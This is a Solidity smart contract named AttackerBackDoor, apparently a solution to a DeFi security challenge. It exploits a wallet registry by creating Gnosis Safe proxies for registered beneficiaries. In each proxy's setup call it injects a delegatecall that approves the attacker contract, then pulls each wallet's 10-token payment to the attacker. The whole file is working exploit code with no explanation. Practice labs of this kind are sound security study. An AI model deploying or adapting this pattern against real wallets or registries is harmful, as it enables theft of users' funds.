// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
//import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";


contract AttackerBackDoor {
    
    uint256 private constant TOKEN_PAYMENT = 10 ether;
    address immutable masterCopy;
    address attacker;
    address[] initialBeneficiaries;
    //address public immutable walletFactory;
    WalletRegistry registry;
    GnosisSafeProxyFactory factory;
    IERC20 immutable token;

    constructor(
        address _factoryAddress, 
        address _masterCopyAddress, 
        address[] memory _initialBeneficiaries, 
        address _tokenAddress,
        address _registryAddress
    ) {
        attacker = msg.sender;
        factory = GnosisSafeProxyFactory(_factoryAddress);
        masterCopy = _masterCopyAddress;
        //initialBeneficiaries = _initialBeneficiaries;
        token = IERC20(_tokenAddress);
        registry = WalletRegistry(_registryAddress);

        for (uint8 i; i < _initialBeneficiaries.length; i++) {
            initialBeneficiaries.push(_initialBeneficiaries[i]);
        }
    }

    function execute() public {
        for (uint8 i; i < initialBeneficiaries.length; i++) {
            address[] memory ownersOfWallet = new address[](1);
            ownersOfWallet[0] = initialBeneficiaries[i];
            GnosisSafeProxy proxy = factory.createProxyWithCallback(
                masterCopy,
                abi.encodeWithSelector(
                    GnosisSafe.setup.selector,
                    ownersOfWallet,
                    1,
                    address(this),
                    abi.encodeWithSignature("transferApprove(address)", address(this)),
                    address(0), 0, 0, 0),
                i,
                registry
            );

            token.transferFrom(address(proxy), attacker, TOKEN_PAYMENT);
            // (bool success, ) = address(proxy).call(abi.encodeWithSignature("transfer(address,uint256)", attacker, 10 ether));
            // require(success, "Error at wallet call");
        }
    }

    function transferApprove(address _spender) external {
        token.approve(_spender, TOKEN_PAYMENT);
    }
}

// function setup(
//         address[] calldata _owners,
//         uint256 _threshold,
//         address to,
//         bytes calldata data,
//         address fallbackHandler,
//         address paymentToken,
//         uint256 payment,
//         address payable paymentReceiver

//execute(to, value, data, operation, gasPrice == 0 ? (gasleft() - 2500) : safeTxGas);